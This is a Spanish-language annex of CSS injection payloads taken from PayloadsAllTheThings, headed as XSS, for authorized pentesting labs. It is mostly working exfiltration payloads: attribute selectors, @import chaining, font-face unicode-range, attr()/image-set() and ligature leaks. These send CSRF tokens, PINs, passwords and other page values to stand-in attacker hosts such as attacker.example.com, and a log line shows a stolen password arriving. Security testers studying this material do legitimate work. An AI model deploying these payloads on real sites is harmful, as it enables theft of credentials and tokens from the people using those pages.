# Cross-Site Scripting (XSS): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [CSS Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/CSS%20Injection/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Metodología / CSS Selectors

### Variantes presentes en tablas o texto del apartado

```text
input[value^=a]
input[value$=a]
input[value*=a]
```

## 2. CSS Selectors / Extracción de datos via Background Image

```css
input[value^="TOKEN_012"] {
  background-image: url(http://attacker.example.com/?prefix=TOKEN_012);
}
```

```css
input[name="pin"][value="1234"] {
  background: url(https://[ATTACKER.DOMAIN.TLD]/log?pin=1234);
}
```

```css
input[name="csrf-token"][value^="a"] + input {
  background: url(https://[ATTACKER.DOMAIN.TLD]/?q=a)
}
```

```css
div:has(input[value="1337"]) {
  background:url(/collectData?value=1337);
}
```

### Variantes presentes en tablas o texto del apartado

```text
+
:has()
list-style-image
border-image
```

## 3. Metodología / CSS Import at-rule

```html
<style>@import url(http://[ATTACKER.DOMAIN.TLD]/staging?len=32);</style>
<style>@import'//[ATTACKER.DOMAIN.TLD]'</style>
```

### Variantes presentes en tablas o texto del apartado

```text
@import
```

## 4. CSS Import at-rule / Sequential Import Chaining (SIC)

### Variantes presentes en tablas o texto del apartado

```text
@import
background-image
```

## 5. CSS Conditionals / Inline Style Extracción de datos

```html
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
```

### Variantes presentes en tablas o texto del apartado

```text
if()
data-uid
```

## 6. Metodología / CSS Font-face at-rule

```html
<style>
@font-face{ font-family:poc; src: url(http://attacker.example.com/?A); /* fetched */ unicode-range:U+0041; }
@font-face{ font-family:poc; src: url(http://attacker.example.com/?B); /* fetched too */ unicode-range:U+0042; }
@font-face{ font-family:poc; src: url(http://attacker.example.com/?C); /* not fetched */ unicode-range:U+0043; }
#sensitive-information{ font-family:poc; }
</style>
<p id="sensitive-information">AB</p>
```

### Variantes presentes en tablas o texto del apartado

```text
unicode-range
/?A
```

## 7. Metodología / Attribute Extraction via attr()

```html
<html>
    <head>
        <link rel="stylesheet" href="http://attacker.local/index.css">
    </head>
    <body>
        <input type="text" name="password" value="supersecret">
    </body>
</html>
```

```css
input[name="password"] {
  background: image-set(attr(value))
}
```

```ps1
10.10.10.10 - - [15/Feb/2026 16:33:21] "GET /supersecret HTTP/1.1" 404 -
```

### Variantes presentes en tablas o texto del apartado

```text
attr()
index.css
image-set()
```

## 8. Metodología / Ligatures

```ps1
docker run -it --rm -p 4242:4242 -e BASE_URL=http://localhost:4242 ghcr.io/adrgs/fontleak:latest
```

```html
<style>@import url("http://localhost:4242/?selector=.secret&parent=head&alphabet=abcdef0123456789");</style>
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
